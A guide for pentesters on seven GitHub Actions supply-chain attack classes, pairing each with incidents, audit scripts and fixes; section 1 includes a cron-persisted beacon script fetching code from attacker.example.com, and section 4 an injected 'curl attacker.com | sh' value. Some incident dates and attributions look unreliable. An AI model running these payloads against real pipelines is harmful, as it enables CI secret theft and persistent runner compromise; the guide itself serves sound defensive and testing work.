# CI/CD Supply Chain — GitHub Actions Deep Dive

> Deep-dive companion to `skills/ci-cd-supply-chain-attack/SKILL.md`.
>
> Audience: pentesters running engagements against organizations whose CI is GitHub Actions. This guide covers the seven highest-yield GitHub Actions attack classes: self-hosted runner compromise, `pull_request_target` permission confusion, secrets in build logs, reusable workflow injection, composite action tampering, Dependabot/Renovate auto-merge exploitation, and `pull_request` trigger scope abuse. Each is mapped to a real-world incident and to a detection rule.

---

## Overview

GitHub Actions is the most-deployed CI system in 2024 — every organization that uses GitHub for source control has it available, and most have it enabled. This makes it the single highest-yield CI surface for red team engagements: the workflows hold deploy secrets, the runners hold OIDC tokens, and the `pull_request_target` trigger is a well-known landmine.

The seven attack classes in this guide account for the majority of real-world GitHub Actions compromises observed from 2020 through 2024. They share a structural pattern: **the trust model assumes the workflow author understood GitHub's permission semantics**, and in most cases the author did not. The result is that a low-privileged attacker (a fork-PR contributor, a dependency maintainer, a runner user) can escalate to the workflow's secrets or to the runner's cloud role.

For each class, the durable fix is the same shape: **least-privilege tokens, ephemeral runners, and OIDC federation instead of long-lived secrets.** Provenance (SLSA / Sigstore) closes the gap on artifact integrity. The hands-on sections show how to test each class and what the durable fix looks like in YAML.

---

## 1. Self-Hosted Runner Compromise — GITHUB_TOKEN and Secret Theft

### Background

GitHub-hosted runners are ephemeral — GitHub destroys the VM after each job. Self-hosted runners are persistent: the same VM (or container) runs job after job. This means a self-hosted runner is a long-lived machine that holds:

- The runner's registration token (lives in `.runner` and `.credentials` files).
- Every secret that any workflow in the repo/org sets via `${{ secrets.* }}`.
- Every OIDC token the runner mints.
- Every artifact the workflow downloads or produces.

Worse, self-hosted runners are often deployed as long-running VMs without re-image cadence, which means a single malicious job persists across jobs.

### Attack: Theft of GITHUB_TOKEN and Secrets

The auto-injected `GITHUB_TOKEN` has `permissions: write` by default on older repos, which means a malicious job can push to the repo, modify releases, and write packages. Secrets declared in the workflow are exposed as environment variables to any step that references them. The simplest malicious job is:

```yaml
# .github/workflows/innocuous-test.yml
name: Tests
on: [push, pull_request_target]
jobs:
  test:
    runs-on: self-hosted
    steps:
      - uses: actions/checkout@v4
      - name: Run tests
        env:
          AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
          AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
        run: ./run-tests.sh
```

If `run-tests.sh` is attacker-controlled (e.g., via path injection, dependency confusion, or a workflow that runs shell from a fork-PR), the attacker has both the runner's filesystem and the secrets. Exfiltration is one `curl` away.

### Persistence on Self-Hosted Runners

A malicious job can drop a cron-persisted reverse shell:

```bash
# Inside a malicious job:
mkdir -p ~/.local/bin
cat > ~/.local/bin/update-runner.sh <<'EOF'
#!/bin/bash
curl -s https://attacker.example.com/beacon | bash
EOF
chmod +x ~/.local/bin/update-runner.sh
(crontab -l 2>/dev/null; echo "*/5 * * * * $HOME/.local/bin/update-runner.sh") | crontab -
```

After this, every job on the runner (across all repos the runner serves) phones home. This is the single highest-severity finding in the GitHub Actions domain.

### Durable Fix

- Replace self-hosted runners with ephemeral runners (Actions Runner Controller on Kubernetes, or AWS-provided AMI-based runners).
- Replace `${{ secrets.* }}` with OIDC federation (`id-token: write`, cloud role assumption).
- Restrict `GITHUB_TOKEN` permissions explicitly: `permissions: { contents: read }`.
- Never allow fork-PR jobs on self-hosted runners.

---

## 2. pull_request_target Permission Confusion

### Background

The `pull_request_target` trigger is a GitHub footgun. It runs the workflow **with the base branch's permissions and secrets** (write access, all secrets) but **checks out the PR's code** if the workflow does an explicit `actions/checkout`. The naive workflow author writes:

```yaml
on: pull_request_target
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: npm install   # runs package.json scripts from the PR
      - run: npm test
```

This runs `npm install` from the PR's code, with full write access to the repo. A malicious fork-PR contributor can run arbitrary code with the repo's `GITHUB_TOKEN`.

### Real-World Incidents

- **October 2020**: Daniel Beck published a disclosure about a GitHub docs repo where `pull_request_target` ran a malicious fork-PR's commands with write access.
- **December 2020**: The Electron project disclosed a similar pattern.
- **2021 onward**: This attack class is in every red team's playbook for GitHub Actions engagements.

### The Correct Pattern

```yaml
on: pull_request_target
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      # Step 1: checkout the BASE branch only (no PR code execution)
      - uses: actions/checkout@v4  # no `ref:` — defaults to base branch

      # Step 2: only run trusted, base-branch code with secrets
      - name: Triage PR
        uses: actions/github-script@v7
        with:
          script: |
            // Only do safe operations: label, comment
            github.rest.issues.addLabels({...})

  test:
    needs: build
    runs-on: ubuntu-latest
    steps:
      # Step 3: if PR code must run, do it WITHOUT secrets and with limited GITHUB_TOKEN
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: npm citest
```

The key principle: **never execute PR-controlled code with the base branch's permissions or secrets.**

### Hands-on: Test for pull_request_target Misuse

```bash
# Find pull_request_target workflows that run shell commands
grep -rln "pull_request_target" .github/workflows/ | while read f; do
  echo "=== $f ==="
  awk '/^jobs:/,/^[a-z]+:$/' "$f" | grep -E "(run:|uses:)" | head -20
done

# Flag workflows that combine pull_request_target + checkout of PR head + run:
for f in $(grep -rln "pull_request_target" .github/workflows/); do
  if grep -q "github.event.pull_request.head.sha" "$f" && \
     grep -qE "^\s*run:" "$f"; then
    echo "HIGH RISK: $f"
  fi
done
```

---

## 3. Secrets in Build Logs

### Background

GitHub Actions masks declared secrets (`${{ secrets.* }}`) in logs by exact-string match. But secrets are easily leaked in ways that defeat masking:

- A secret printed as base64 (the base64 string isn't masked).
- A secret printed character-by-character.
- A secret embedded in a multi-line error message where the masking logic only matches the exact registered value.
- A secret used in a command line argument, which `ps` reveals.
- A secret accidentally committed to a CI cache (e.g., `~/.npmrc`).

### Real-World Patterns

- **2022**: A pattern of `echo $DEPLOY_KEY | base64` was used in many workflows to "debug" — attackers monitor public repos' Actions logs for base64 secrets.
- **2023**: GitHub added `actions/cache` warnings after multiple incidents where caches containing `.npmrc` (with `NODE_AUTH_TOKEN`) were publicly downloadable from fork-PRs.
- **Codecov-class**: The 2021 Codecov breach (see case-studies guide) is the canonical example — the install script's exfiltration pattern is reproduced in any workflow that does `curl | bash` with env vars in scope.

### Hands-on: Hunt for Secret Leakage

```bash
# Find workflow steps that print env vars
grep -rn -E "echo.*\$\{|print.*\{\{.*secrets|console\.log.*process\.env" \
  .github/workflows/

# Find workflows that use actions/cache to cache dirs that may contain secrets
grep -rn "actions/cache" .github/workflows/ | grep -E "npmrc|pip|netrc|ssh|aws/credentials"

# Find workflows that pipe env vars through base64 (a leak pattern)
grep -rn -E "\|\s*base64" .github/workflows/

# Find workflows that pass secrets as CLI args (ps-revealed)
grep -rn -E "\-\-password.*\$\{|--token.*\$\{" .github/workflows/
```

### Durable Fix

- Use `step-security/harden-runner` to block egress to non-allowlisted hosts.
- Run jobs in an egress-restricted environment (no `curl attacker.com`).
- Use OIDC instead of long-lived secrets.
- Audit `${{ secrets.* }}` references against `grep` for echo/log statements.

---

## 4. Reusable Workflow Injection

### Background

Reusable workflows (`workflow_call`) are a powerful abstraction: a central workflow can be called by any repo in an org. But reusable workflows that interpolate caller-supplied inputs into `run:` blocks are vulnerable to script injection.

```yaml
# central-workflow.yml
on:
  workflow_call:
    inputs:
      module-name:
        required: true
        type: string
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: ./build.sh ${{ inputs.module-name }}   # INJECTION
```

If a caller repo passes `module-name: "foo; curl attacker.com | sh"`, the workflow runs the injected shell with the central workflow's permissions and secrets.

### Real-World Pattern

- **2022**: GitHub Security Lab published a write-up of this pattern in multiple orgs.
- **2023**: Octopus Deploy and similar org-level reusable-workflow operators disclosed fixes.

### Hands-on: Find Reusable-Workflow Injection Sinks

```bash
# Find reusable workflows (workflow_call) with run: steps
for f in $(grep -rln "workflow_call" .github/workflows/); do
  echo "=== $f ==="
  awk '/^jobs:/,0' "$f" | grep -E "run:.*\$\{" 
done

# Safe pattern: use env: instead of inline interpolation
# UNSAFE: run: ./build.sh ${{ inputs.module-name }}
# SAFE:    env: { MODULE: ${{ inputs.module-name }} } run: ./build.sh "$MODULE"
```

### Durable Fix

- Use `env:` to pass user input into `run:` blocks — shell cannot inject through env vars the same way.
- Validate inputs against a strict regex before use.
- Run reusable workflows with the caller's permissions, not the central workflow's secrets.

---

## 5. Composite Action Tampering

### Background

Composite actions (`action.yml` with `runs: using: composite`) are reusable steps. They are referenced by `uses: org/action@ref`. If the `@ref` is a tag, an attacker who can push to the action's repo can re-tag the same commit and ship a malicious version under the same tag.

Worse: if the action is referenced by `@main` or `@master`, every workflow that uses it pulls whatever is on the default branch at the moment of run — there is no pinning.

### Real-World Incidents

- **2021**: tj-actions/changed-files was retagged multiple times by attackers.
- **2025**: tj-actions/changed-files was compromised (March 2025) — attackers retagged the action v45 to push a stealer that exfiltrated CI secrets via a curl to `cdn.jsdelivr-net[.]at` from thousands of pipelines that used `@v45` (not pinned to a SHA). This is one of the largest GitHub Actions supply chain incidents to date.
- **2022**: A similar pattern hit `actions/checkout` forks.

### Hands-on: Hunt for Unpinned Actions

```bash
# Find actions referenced by tag (mutable) instead of SHA
grep -rn "uses:" .github/workflows/ | grep -E "@(v[0-9]+|main|master|latest)" | \
  grep -v "@[a-f0-9]\{40\}"

# Use https://github.com/sethvargo/ratchet or Moby's pin actions tool to auto-pin:
ratchet pin .github/workflows/ci.yml
```

### Durable Fix

- Pin every action to a 40-character commit SHA.
- Use `renovatebot` or `dependabot` to update SHAs in PRs (reviewed by humans).
- Use OpenSSF Scorecard to scan for unpinned actions in your org.

---

## 6. Dependabot / Renovate Auto-Merge Exploitation

### Background

Dependabot and Renovate open PRs for outdated dependencies. Many orgs auto-merge "minor" or "patch" PRs after green CI. This pattern is exploitable:

1. Attacker publishes a malicious version of a dependency (e.g., `1.2.4` of a real package they compromised or a typosquatted name).
2. Dependabot opens a PR bumping to `1.2.4`.
3. CI runs (with the malicious `postinstall` or `setup.py`).
4. Auto-merge fires.
5. The malicious dependency is now in production.

### Real-World Incidents

- **2021**: `ua-parser-js` (npm) — maintainer's account was compromised and three malicious versions were published; auto-merging Dependabot PRs spread them.
- **2022**: `coa`, `rc` (npm) — same pattern.
- **2024**: PyPI `ultraeval` and similar — auto-merge spread malicious packages.

### Hands-on: Test Auto-Merge Posture

```bash
# Check for auto-merge on Dependabot PRs
grep -rn "automerge" .github/dependabot.yml
cat .github/workflows/dependabot-automerge.yml 2>/dev/null

# Find repos in an org with auto-merge enabled
gh search code --owner myorg "automerge_head_sha" --filename "*.yml" | \
  awk '{print $1}' | sort -u

# Check if Dependabot runs with secrets (it does by default — a malicious postinstall exfiltrates them)
grep -rn -A5 "dependabot" .github/workflows/ | grep -E "secrets\.|env:"
```

### Durable Fix

- Disable auto-merge for new major/minor versions.
- Require human review for any dependency bump.
- Run Dependabot jobs with NO secrets (GitHub allows `secrets: inherit` opt-out — never inherit).
- Use Socket.dev / Snyk / Dependi to gate Dependabot PRs on supply-chain risk scores.

---

## 7. pull_request Trigger Scope Abuse

### Background

The `pull_request` trigger fires for fork-PRs by default with `GITHUB_TOKEN` read-only. But workflows that grant `permissions: write-all` to `pull_request` jobs give the fork-PR contributor write access to the repo's labels, comments, and (in older config) commits.

### Real-World Pattern

- **2021**: Multiple orgs disclosed that fork-PR contributors could push to `gh-pages` via a `pull_request` workflow with `contents: write`.
- **2022**: GitHub restricted `pull_request` permissions for fork-PRs by default — but orgs with `actions/checkout` ref overrides still leak.

### Hands-on: Audit pull_request Permissions

```bash
# Find workflows with pull_request trigger AND elevated permissions
for f in $(grep -rln "on:.*pull_request" .github/workflows/); do
  echo "=== $f ==="
  grep -E "^permissions:|^\s+\w+:\s*write" "$f"
done
```

### Durable Fix

- Default to `permissions: contents: read` at the workflow level.
- Use `pull_request_target` only when secrets are needed, and never with PR-controlled code.
- Pin `permissions` per-job, not per-workflow, for finer control.

---

## Hands-on: End-to-End GitHub Actions Engagement

### Step-by-step: Recon

```bash
# Enumerate all workflows in target org
gh repo list myorg --limit 200 | while read repo; do
  gh api "repos/$repo/contents/.github/workflows" 2>/dev/null | \
    jq -r '.[].name' 2>/dev/null | while read wf; do
      echo "$repo: $wf"
    done
done > workflows.txt

# Triage by trigger (pull_request_target = high value)
grep -B2 "pull_request_target" workflows.txt
```

### Step-by-step: Test Each Class

Run the checks from sections 1–7 above. Document findings in a `findings.yaml` that references the canonical incident.

### Step-by-step: Build the SIEM Rulebook

For each class, write a detection rule. Example for `pull_request_target` misuse (GitHub Audit Log):

```yaml
detection:
  selection:
    action:
      - "workflows.run_workflow_call"
      - "workflows.run_pull_request_target"
    workflow_repository: "*"
  filter_trusted_workflows:
    workflow_path:
      - ".github/workflows/trusted-triage.yml"
  condition: selection and not filter_trusted_workflows
```

---

## References

1. GitHub Docs — Security hardening for GitHub Actions — https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions
2. GitHub Security Lab — Pull_request_target abuse write-up — https://securitylab.github.com/research/github-actions-preventing-pwn-requests/
3. GitHub Blog — Keeping your GitHub Actions and workflows secure (series) — https://github.blog/news-insights/product-news/keeping-your-github-actions-and-workflows-secure-part-1/
4. Octoverse — tj-actions/changed-files incident (March 2025) — https://www.stepsecurity.io/blog/harden-runner-detection-tj-actions-changed-files
5. CISA — Security Best Practices for GitHub Actions — https://www.cisa.gov/resources-tools/resources/securing-software-supply-chain
6. OpenSSF Scorecard — Action pinning checks — https://github.com/ossf/scorecard/blob/main/docs/checks.md
7. SLSA — Build Provenance for GitHub Actions — https://slsa.dev/spec/v1.0/terminology
8. GitHub Security Advisories Database — https://github.com/advisories
9. Step Security Harden-Runner — egress-restricted Actions — https://github.com/step-security/harden-runner
10. Ratchet — Pin GitHub Actions to SHAs — https://github.com/sethvargo/ratchet
11. Dependabot — Auto-merge risks documentation — https://docs.github.com/en/code-security/dependabot/working-with-dependabot/automating-dependabot-with-github-actions
12. Socket.dev — Detecting malicious npm packages in Dependabot PRs — https://socket.dev/blog
13. GitHub Actions Runner Controller (ARC) — ephemeral runners — https://github.com/actions/actions-runner-controller
14. Google SRE Book — Build Provenance chapter — https://sre.google/sre-book/
15. GitHub Audit Log API — detection queries — https://docs.github.com/en/rest/enterprise/audit-log
